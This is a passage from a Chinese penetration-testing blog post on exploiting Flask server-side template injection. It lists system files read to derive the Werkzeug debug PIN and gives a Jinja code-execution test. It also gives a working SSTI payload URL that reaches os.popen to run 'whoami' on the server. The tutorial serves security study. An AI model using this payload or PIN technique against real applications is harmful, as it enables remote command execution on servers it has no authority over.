+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622152622.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622152622.png-water_print" /></p>
+<h5 id="机器码">机器码</h5>
+<p>读取：<code>/etc/machine-id</code> 或者 <code>/proc/self/cgroup</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622152957.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622152957.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622152957.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622152957.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622152957.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622152957.png-water_print" /></p>
+<h3 id="执行脚本">执行脚本</h3>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622153235.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622153235.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622153235.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622153235.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622153235.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622153235.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622153404.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622153404.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622153404.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622153404.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622153404.png-water_print"
+        title="输入 PIN 码" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622153639.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622153639.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622153639.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622153639.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622153639.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622153639.png-water_print" /></p>
+<h2 id="ssti-导致-rce">SSTI 导致 RCE</h2>
+<h3 id="代码执行">代码执行</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{%for i in range(10)%}
+{%print(i)%}
+{%endfor%}
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622154036.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622154036.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622154036.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622154036.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622154036.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622154036.png-water_print" /></p>
+<h3 id="python-魔法函数--内置函数">python 魔法函数 + 内置函数</h3>
+<h4 id="魔法函数">魔法函数</h4>
+<p>所谓魔法函数(Magic Methods)，是 Python 的一种高级语法，允许你在类中自定义函数(函数名格式一般为 <code>__x__</code>)，并绑定到类的特殊方法中。比如在类 A 中自定义 <code>__str__</code> 函数，则在调用 <code>str(A)</code> 时，会自动调用 <code>__str__</code> 函数，并返回相应的结果。在我们平时的使用中，可能经常使用 <code>__init__</code> 函数和 <code>__del__</code> 函数，其实这也是魔法函数的一种。</p>
+<h4 id="内置函数">内置函数</h4>
+<p>在 python 中输入 <code>help(__builtins__)</code>，可以查看帮助，简单地说就是 Python 中自带的函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1:8345/hello?name=\{\{%22%22.__class__.__base__.__subclasses__()[302].__init__.__globals__[%27os%27].popen(%22whoami%22).read()\}\}
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622160206.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622160206.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622160206.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622160206.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622160206.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622160206.png-water_print" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-06-22</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/" data-title="Flask SSTI 利用方式探索"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/" data-title="Flask SSTI 利用方式探索"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/" data-title="Flask SSTI 利用方式探索"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>,&nbsp;<a href="/tags/ssti/">SSTI</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/" class="prev" rel="prev" title="Redis 在渗透测试中常见的利用方式"><i class="fas fa-angle-left fa-fw"></i>Redis 在渗透测试中常见的利用方式</a>
+            <a href="/2020/07/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11989/" class="next" rel="next" title="Shiro 权限绕过漏洞复现(CVE-2020-11989)">Shiro 权限绕过漏洞复现(CVE-2020-11989)<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
